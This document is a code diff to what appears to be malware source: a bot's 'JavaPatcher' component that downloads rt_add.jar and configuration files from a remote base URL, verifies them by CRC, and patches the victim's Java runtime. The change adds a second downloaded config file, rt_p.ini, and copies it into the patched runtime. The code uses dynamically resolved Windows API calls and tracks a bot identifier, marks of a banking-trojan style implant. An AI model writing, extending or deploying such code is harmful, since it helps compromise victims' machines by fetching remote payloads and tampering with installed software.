@@ -198,7 +198,7 @@ static bool UID_To_File(char* BotUid)
 	return false;
 }
 
-static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAddPath, const char* iniFilePath, const char* jarExePath, char* libPath )
+static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAddPath, const char* iniFilePath, const char* iniFilePath2, const char* jarExePath, char* libPath )
 {
 	DBG( "JavaPatcher", "Unpacking rt_add.jar" );
 	if( !UnpackToDir( rtAddPath, tmpRtPath, jarExePath ) )
@@ -226,6 +226,8 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 	pDeleteFileA( ".\\rt2.log" );
 
 	if( pCopyFileA( iniFilePath, ".\\rt.ini", FALSE) == 0 )
+		return false;
+	if( pCopyFileA( iniFilePath2, ".\\rt_p.ini", FALSE) == 0 )
 		return false;
 
 	if( pSetCurrentDirectoryA(javaHome) == 0 )
@@ -370,7 +372,7 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 	return res;
 }
 
-static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* iniFilePath, char* jarExeFilePath, char* javaExe )
+static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* iniFilePath, char* iniFilePath2, char* jarExeFilePath, char* javaExe )
 {
 	FILE_CRC32* filesCrc32 = LoadCorrectCRC32(baseUrl);
 
@@ -400,6 +402,12 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	crcName = addUrl;
 	File::GetTempName(iniFilePath);
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath, crcName ) )
+		return false;
+
+	addUrl = "rt_p.ini";
+	crcName = addUrl;
+	File::GetTempName(iniFilePath2);
+	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath2, crcName ) )
 		return false;
 
 	//загрузка файлов во временную папку
@@ -492,12 +500,12 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	else
 		pCreateDirectoryA( (char*)tmpRtPath, NULL );
 
-	MemPtr<MAX_PATH> rtAddFilePath, iniFilePath, jarExeFilePath;
+	MemPtr<MAX_PATH> rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath;
 
 	bool res = false;
-	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, jarExeFilePath, javaExe ) )
+	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, javaExe ) )
 	{
-		if( Patch( userName, tmpRtPath, rtAddFilePath, iniFilePath, jarExeFilePath, libPatch ) )
+		if( Patch( userName, tmpRtPath, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, libPatch ) )
 			res = true;
 	}
 	
